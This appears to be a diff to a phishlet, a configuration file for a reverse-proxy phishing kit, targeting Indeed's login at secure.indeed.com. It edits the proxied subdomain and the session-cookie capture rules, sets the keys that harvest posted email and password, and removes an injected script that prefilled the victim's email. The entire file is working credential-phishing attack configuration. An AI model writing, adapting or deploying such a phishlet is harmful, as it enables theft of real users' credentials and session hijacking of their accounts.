@@ -1,36 +1,21 @@
 author: '@sanchal'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'indeed.com', session: true, is_landing: true}
-sub_filters: []
+  - {phish_sub: 'secure', orig_sub: 'secure', domain: 'indeed.com', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'secure.indeed.com', orig_sub: 'secure', domain: 'indeed.com', search: 'https://{hostname}/auth/', replace: 'https://{hostname}/auth/', mimes: ['text/html', 'application/json', 'application/javascript']}
 auth_tokens:
-  - domain: '.www.indeed.com'
-    keys: ['li_at']
+  - domain: '.indeed.com'
+    keys: []
 credentials:
   username:
-    key: 'session_key'
+    key: '__email'
     search: '(.*)'
     type: 'post'
   password:
-    key: 'session_password'
+    key: '__password'
     search: '(.*)'
     type: 'post'
 login:
   domain: 'secure.indeed.com'
   path: '/auth'
-js_inject:
-  - trigger_domains: ["secure.indeed.com"]
-    trigger_paths: ["/auth"]
-    trigger_params: ["__email"]
-    script: |
-      function lp(){
-        var email = document.querySelector("#__email");
-        var password = document.querySelector("#__password");
-        if (email != null && password != null) {
-          email.value = "{email}";
-          password.focus();
-          return;
-        }
-        setTimeout(function(){lp();}, 100);
-      }
-      setTimeout(function(){lp();}, 100);
